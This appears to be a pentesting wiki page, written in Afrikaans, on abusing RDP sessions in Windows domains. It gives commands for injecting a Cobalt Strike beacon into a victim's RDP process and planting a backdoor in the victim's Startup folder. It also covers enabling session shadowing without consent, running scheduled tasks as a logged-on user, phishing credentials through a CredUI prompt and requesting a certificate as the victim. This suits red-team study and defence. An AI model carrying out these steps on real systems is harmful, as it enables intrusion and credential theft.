# RDP Sessions Abuse

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

As die **external group** **RDP access** tot enige **computer** in die huidige domein het, kan ’n **attacker** daardie **computer** kompromitteer en vir hom wag.

Sodra daardie gebruiker via RDP toegang verkry het, kan die **attacker** na daardie gebruiker se sessie **pivot** en sy toestemmings in die external domain misbruik.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Kyk na **ander maniere om sessions met ander tools te steel** [**op hierdie bladsy.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

As ’n gebruiker via **RDP toegang tot ’n masjien verkry** waar ’n **aanvaller** vir hom **wag**, sal die aanvaller in staat wees om **’n beacon in die gebruiker se RDP-session te injecteer**, en as die **slagoffer sy drive gemount het** toe hy via RDP toegang verkry het, kon die **aanvaller toegang daartoe verkry**.

In hierdie geval kon jy eenvoudig die **slagoffer** se **oorspronklike rekenaar compromise** deur ’n **backdoor** in die **statup folder** te skryf.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

As jy **local admin** is op ’n host waar die victim reeds ’n **active RDP session** het, kan jy moontlik daardie desktop **view/control sonder om die password te steel of LSASS te dump**.<sup>[[1]](#references)</sup>

Dit hang af van die **Remote Desktop Services shadowing**-beleid wat gestoor word in:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Interessante waardes:

- `0`: Gedeaktiveer
- `1`: `EnableInputNotify` (beheer, gebruikerstoestemming vereis)
- `2`: `EnableInputNoNotify` (beheer, **geen gebruikerstoestemming**)
- `3`: `EnableNoInputNotify` (slegs besigtiging, gebruikerstoestemming vereis)
- `4`: `EnableNoInputNoNotify` (slegs besigtiging, **geen gebruikerstoestemming**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Dit is veral nuttig wanneer ’n bevoorregte gebruiker wat oor RDP gekoppel is, ’n ontsluite lessenaar, KeePass-sessie, MMC-konsole, browsersessie of admin shell oop en onbewaak gelaat het.

## Scheduled Tasks As Logged-On User

As jy ’n **local admin** is en die teikengebruiker **tans aangemeld is**, kan Task Scheduler code **as daardie gebruiker sonder hul wagwoord** begin.<sup>[[1]](#references)[[4]](#references)</sup>

Dit verander die slagoffer se bestaande aanmeldingsessie in ’n uitvoeringsmeganisme:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notas:

- As die gebruiker **nie aangemeld is nie**, vereis Windows gewoonlik die wagwoord om ’n taak te skep wat as daardie gebruiker loop.
- As die gebruiker **aangemeld is**, kan die taak die bestaande aanmeldingskonteks hergebruik.
- Dit is ’n praktiese manier om GUI-aksies uit te voer of binaries binne die slagoffer-sessie te begin sonder om aan LSASS te raak.

## CredUI Prompt Abuse From the Victim Session

Sodra jy **binne die slagoffer se interaktiewe desktop** kan uitvoer (byvoorbeeld via **Shadow RDP** of **’n geskeduleerde taak wat as daardie gebruiker loop**), kan jy ’n **egte Windows credential prompt** met CredUI-API’s vertoon en credentials wat deur die slagoffer ingevoer word, harvest.<sup>[[1]](#references)</sup>

Relevante API’s:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipiese vloei:

1. Spawn ’n binary in die slagoffer-sessie.
2. Vertoon ’n domein-authentication prompt wat by die huidige domein-branding pas.
3. Unpack die teruggekeerde auth buffer.
4. Valideer die verskafde credentials en hou opsioneel aan om prompts te vertoon totdat geldige credentials ingevoer word.

Dit is nuttig vir **on-host phishing**, omdat die prompt deur standaard Windows-API’s gerender word in plaas van ’n vals HTML-vorm.

## Requesting a PFX In the Victim Context

Dieselfde **scheduled-task-as-user** primitive kan gebruik word om ’n **certificate/PFX as the logged-on victim** aan te vra. Daardie certificate kan later vir **AD authentication** as daardie gebruiker gebruik word, wat password theft heeltemal vermy.<sup>[[1]](#references)[[5]](#references)</sup>

Hoëvlak-vloei:

1. Kry **local admin** op ’n host waarop die slagoffer aangemeld is.
2. Run enrollment/export logic as the victim using a **scheduled task**.
3. Export die resulterende **PFX**.
4. Gebruik die PFX vir PKINIT / certificate-based AD authentication.

Sien die AD CS-bladsye vir verdere abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
